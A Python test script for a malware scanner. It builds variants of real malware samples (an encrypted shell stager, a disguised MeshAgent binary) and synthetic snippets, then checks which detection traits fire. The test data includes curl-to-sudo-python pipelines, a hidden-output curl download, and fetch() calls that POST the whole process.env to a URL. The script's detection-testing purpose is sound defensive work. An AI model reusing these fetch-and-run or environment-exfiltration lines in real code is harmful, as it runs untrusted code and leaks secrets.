#!/usr/bin/env python3
"""Exercise evidence boundaries without executing samples or their hooks."""
import argparse
import hashlib
import json
import os
from pathlib import Path
import re
import subprocess
import tempfile

p = argparse.ArgumentParser()
p.add_argument('--inventory', required=True)
p.add_argument('--atomscan', default='../scan/target/release/atomscan')
p.add_argument('--output', required=True)
a = p.parse_args()
inventory = json.loads(Path(a.inventory).read_text())
if isinstance(inventory, dict):
    inventory = inventory['samples']

def sample(name):
    row = next(r for r in inventory if Path(r['path']).name == name)
    data = Path(row.get('local_path', row['path'])).read_bytes()
    assert hashlib.sha256(data).hexdigest() == row['sha256']
    return data

aes = 'objectives/anti-static/obfuscation/decryption::shell-concealed-aes-output-evaluation'
aes_bound = 'objectives/anti-static/obfuscation/decryption::shell-eval-aes-command-output'
mesh = 'objectives/evasion/masquerade/version-resource/claim::mesh-agent-browser-product-disguise'
env = 'objectives/exfiltration/stealer/env::fetch-full-environment-exfiltration'
hidden = 'objectives/evasion/file-hiding/staging::python-hidden-home-path-execution'
telemetry = 'micro-behaviors/os/telemetry/logging/lifecycle::python-import-environment-event'
curl_hidden = 'micro-behaviors/communications/http/download/curl::shell-curl-hidden-output'
sudo_python = 'micro-behaviors/process/deploy/interpreter-stdin::shell-curl-json-content-sudo-python'
retired = {
    'objectives/supply-chain/hidden-payload/runtime::python-downloaded-module-child-interpreter',
    'objectives/supply-chain/credential-theft/npm-token::postinstall-generated-package-registry-publish',
    'objectives/supply-chain/credential-theft/npm-token::postinstall-npmrc-write-and-publish',
}

with tempfile.TemporaryDirectory(prefix='hopper-evidence-boundaries-') as directory:
    tmp = Path(directory)
    cases = []

    def add(name, data, yes=None, no=(), ceiling=None):
        path = tmp / name
        path.parent.mkdir(parents=True, exist_ok=True)
        path.write_bytes(data.encode() if isinstance(data, str) else data)
        cases.append((path, yes or {}, set(no) | retired, ceiling))

    source = sample('stage1_b5a208e64603.zsh').decode()
    add('renamed.sh', source, {aes: 5, aes_bound: 4})
    renamed = re.sub(r'\b_r\b', 'other_result', source)
    add('renamed-variable.sh', renamed, {aes: 5})
    add('braced.sh', source.replace('eval "$_r"', 'eval "${_r}"'), {aes: 5})
    add('unquoted.sh', source.replace('eval "$_r"', 'eval $_r'), {aes: 5})
    add('function.sh', '#!/bin/sh\nrun_stage() {\n' + source + '\n}\n', {aes: 5})
    add('unrelated-eval.sh', source.replace('eval "$_r"', 'eval "$other"'), no=(aes, aes_bound))
    add('overwritten-result.sh', source.replace('eval "$_r"', '_r="echo harmless"\neval "$_r"'), no=(aes, aes_bound))
    add('comment-before-eval.sh', source.replace('eval "$_r"', '# evaluate the decoded stage\neval "$_r"'), {aes: 5})
    add('quoted-decrypt-command.sh', 'plain=$(printf "%s" "openssl enc -d -aes-128-ctr")\neval "$plain"\n', no=(aes, aes_bound))
    add('print-decryption.sh', source.replace('eval "$_r"', 'printf "%s" "$_r"'), no=(aes, aes_bound))
    add('unconcealed-decrypt.sh', 'plain=$(openssl enc -d -aes-128-ctr -in archive)\neval "$plain"\n', {aes_bound: 4}, no=(aes,))
    add('hidden-curl-output.sh', 'curl -sfo /tmp/.r https://stage.invalid/bootstrap\n', {curl_hidden: 4})
    add('linter-config.sh', 'curl -fsSL https://config.invalid/linter -o .yamllint.yml\n', no=(curl_hidden,), ceiling=3)
    add('sudo-json-pipeline.sh', 'curl -s https://api.invalid/script | jq -r .content | sudo python3\n', {sudo_python: 3})
    add('quoted-sudo-pipeline.sh', "curl -s https://api.invalid/script | jq '.content | sudo python3'\n", no=(sudo_python,))

    agent = sample('158215c7371e868f3d0c7fd2e92f05026a8678a3635629d89bd6042ee543278a.exe')
    add('renamed-agent.exe', agent, {mesh: 5})
    edge = 'Edge'.encode('utf-16le')
    assert edge in agent
    add('honest-agent.exe', agent.replace(edge, 'Mesh'.encode('utf-16le')), no=(mesh,))
    marker = b'MeshCentral MeshAgent: Copyright 2006 - 2022 Intel Corporation'
    assert marker in agent
    add('no-implementation.exe', agent.replace(marker, b'X' * len(marker)), no=(mesh,))
    assert b'wss://' in agent
    add('no-agent-channel.exe', agent.replace(b'wss://', b'xxx://'), no=(mesh,))
    add('driver-cheat.exe', sample('fortnite external unsafe.exe'), ceiling=4)

    for method in ('POST', 'PUT', 'PATCH'):
        add(method + '.js', f'fetch(url, {{method: "{method}", body: JSON.stringify({{context: process.env}})}});', {env: 4})
    add('reversed.js', 'fetch(url, {body: JSON.stringify(process.env), method: "POST"});', {env: 4})
    add('reversed-object.js', 'fetch(url, {body: JSON.stringify({context: process.env}), method: "POST"});', {env: 4})
    add('separate-post.js', 'fetch(url, {body: JSON.stringify(process.env)}); fetch(other, {method: "POST", body: "ok"});', no=(env,))
    add('get-with-other-post.js', 'fetch(url, {method: "GET", body: JSON.stringify({env: process.env})}); fetch(other, {method: "POST"});', no=(env,))
    add('selected-value.js', 'fetch(url, {method: "POST", body: JSON.stringify({version: process.env.APP_VERSION})});', no=(env,))
    add('unrelated-json.js', 'console.log(JSON.stringify(process.env)); fetch(url, {method: "POST", body: "ok"});', no=(env,))
    add('ordinary-body.js', 'fetch(url, {method: "POST", body: JSON.stringify({env: "production"})});', no=(env,))

    for dirname in ('.venv', '.venvs', '.virtualenv', '.virtualenvs'):
        add(dirname[1:] + '.py', f'import subprocess\nsubprocess.run(["/home/alice/{dirname}/job/bin/python", "job.py"])\n', no=(hidden,), ceiling=3)
    add('hidden-executable.py', 'import subprocess\nsubprocess.run(["/home/alice/.payload/run"])\n', {hidden: 4})
    event = '''import sys
try:
    if is_telemetry_enabled():
        record_event("module_init", {"python_version": sys.version})
except ImportError:
    pass
'''
    add('opt-in-event.py', event, {telemetry: 3}, ceiling=3)
    add('no-version-event.py', event.replace('sys.version', '"unknown"'), no=(telemetry,), ceiling=3)

    for name in ('slatejob-0.1.0-py3-none-any.whl', 'jobwharf-0.1.0-py3-none-any.whl'):
        add(name, sample(name), ceiling=3)
    for version in ('19', '21', '22'):
        name = f'publish-poc-test3-1.0.{version}.tgz'
        add(name, sample(name))

    result = subprocess.run(
        [a.atomscan, '--no-update', '--mode', 'slow', '--format', 'json', 'path']
        + [str(c[0]) for c in cases],
        env=dict(os.environ, CLEAVE_TRAITS_DIR=str(Path.cwd()),
                 XDG_CACHE_HOME=str(tmp / 'cache')),
        capture_output=True, text=True,
    )
    assert result.returncode in (0, 1), result.stderr
    observed = {}
    for line in result.stdout.splitlines():
        files = json.loads(line)['raw']['files']
        observed[files[0]['path']] = {
            t['id']: t['crit'] for f in files for t in f.get('traits', [])
        }
    assert len(observed) == len(cases), (len(observed), len(cases), result.stderr)
    report = []
    for path, yes, no, ceiling in cases:
        traits = observed[str(path)]
        assert all(traits.get(k) == v for k, v in yes.items()), (path.name, yes, traits)
        assert not no.intersection(traits), (path.name, no.intersection(traits))
        if ceiling is not None:
            assert max(traits.values(), default=0) <= ceiling, (path.name, {k:v for k,v in traits.items() if v>ceiling})
        report.append({'case': path.name, 'required': yes, 'forbidden': sorted(no),
                       'max_criticality': ceiling, 'passed': True})
    Path(a.output).write_text(json.dumps(report, indent=2) + '\n')
    print(f'{len(report)} evidence-boundary cases passed')
